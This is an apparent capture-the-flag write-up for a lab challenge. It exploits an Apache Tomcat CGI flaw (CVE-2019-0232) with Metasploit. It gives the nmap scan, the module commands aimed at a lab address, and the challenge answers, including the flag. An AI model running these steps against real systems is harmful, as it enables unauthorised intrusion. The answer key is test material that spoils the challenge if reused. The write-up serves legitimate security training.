---
description: Networking - Metasploit
---

# Ready, set, elf.

## Video

{% embed url="https://www.youtube.com/watch?v=6DOp2Fn1AsQ&feature=emb\_logo" %}

## Resources

`systeminfo`

[URL encoded](https://www.techopedia.com/definition/10346/url-encoding)

## Challenge

### What is the version number of the web server?

```text
nmap -Pn -sC -sV -O -v 10.10.198.75
```

![](../.gitbook/assets/image%20%282%29.png)

![](../.gitbook/assets/image%20%2851%29.png)

{% hint style="success" %}
9.0.17
{% endhint %}

###  What CVE can be used to create a Meterpreter entry onto the machine? \(Format: CVE-XXXX-XXXX\)

![](../.gitbook/assets/image%20%2812%29.png)

![](../.gitbook/assets/image%20%2852%29.png)

{% hint style="success" %}
CVE-2019-0232
{% endhint %}

### Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.

![](../.gitbook/assets/image%20%2832%29.png)

```text
msfconsole
search 2019-0232
use exploit/windows/http/tomcat_cgi_cmdlineargs
show targets
set TARGET 0
show options
set RHOST 10.10.198.75
set targeturi /cgi-bin/elfwhacker.bat
exploit
```

{% hint style="success" %}
**`No answer needed`**
{% endhint %}

### What are the contents of flag1.txt

![](../.gitbook/assets/image%20%2870%29.png)

![](../.gitbook/assets/image%20%2838%29.png)

{% hint style="success" %}
thm{whacking\_all\_the\_elves}
{% endhint %}

### Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!

{% hint style="success" %}
**`No answer needed`**
{% endhint %}

